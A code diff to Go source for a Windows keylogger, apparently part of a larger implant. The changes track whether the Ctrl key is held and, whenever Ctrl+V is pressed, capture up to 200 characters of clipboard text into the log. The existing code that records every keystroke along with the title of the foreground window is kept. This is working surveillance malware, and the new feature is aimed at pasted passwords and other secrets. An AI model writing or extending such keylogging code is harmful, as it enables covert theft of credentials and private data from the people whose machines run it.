@@ -64,6 +64,7 @@ type keylogState struct {
 	threadID   uint32
 	startTime  time.Time
 	keyCount   int
+	ctrlDown   bool
 }
 
 var kl = &keylogState{}
@@ -267,30 +268,52 @@ func keylogLoop(started chan<- error) {
 
 // keyboardHookProc is the callback for the keyboard hook
 func keyboardHookProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
-	if nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+	if nCode >= 0 {
 		kbData := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
 
-		// Get foreground window title for context
-		currentWindow := getForegroundWindowTitle()
-
-		kl.mu.Lock()
-
-		// Log window change
-		if currentWindow != kl.lastWindow && currentWindow != "" {
-			kl.buffer.WriteString(fmt.Sprintf("\n[%s] --- %s ---\n",
-				time.Now().Format("15:04:05"), currentWindow))
-			kl.lastWindow = currentWindow
+		// Track Ctrl modifier state across press/release
+		if kbData.VkCode == 0x11 || kbData.VkCode == 0xA2 || kbData.VkCode == 0xA3 {
+			kl.mu.Lock()
+			kl.ctrlDown = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+			kl.mu.Unlock()
 		}
 
-		// Translate virtual key to readable string
-		keyName := vkToString(kbData.VkCode, kbData.ScanCode)
-		kl.buffer.WriteString(keyName)
-		kl.keyCount++
+		if wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN {
+			currentWindow := getForegroundWindowTitle()
 
-		kl.mu.Unlock()
+			kl.mu.Lock()
+
+			if currentWindow != kl.lastWindow && currentWindow != "" {
+				kl.buffer.WriteString(fmt.Sprintf("\n[%s] --- %s ---\n",
+					time.Now().Format("15:04:05"), currentWindow))
+				kl.lastWindow = currentWindow
+			}
+
+			// Detect Ctrl+V paste and capture clipboard content
+			if kl.ctrlDown && kbData.VkCode == 0x56 { // VK_V
+				kl.mu.Unlock()
+				if clip := clipReadText(); clip != "" {
+					kl.mu.Lock()
+					if len(clip) > 200 {
+						clip = clip[:200] + "..."
+					}
+					kl.buffer.WriteString(fmt.Sprintf("[PASTE:%s]", clip))
+					kl.keyCount++
+					kl.mu.Unlock()
+				} else {
+					kl.mu.Lock()
+					kl.keyCount++
+					kl.mu.Unlock()
+				}
+			} else {
+				keyName := vkToString(kbData.VkCode, kbData.ScanCode)
+				kl.buffer.WriteString(keyName)
+				kl.keyCount++
+				kl.mu.Unlock()
+			}
+		}
 	}
 
-	// Always call next hook
 	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
 	return ret
 }
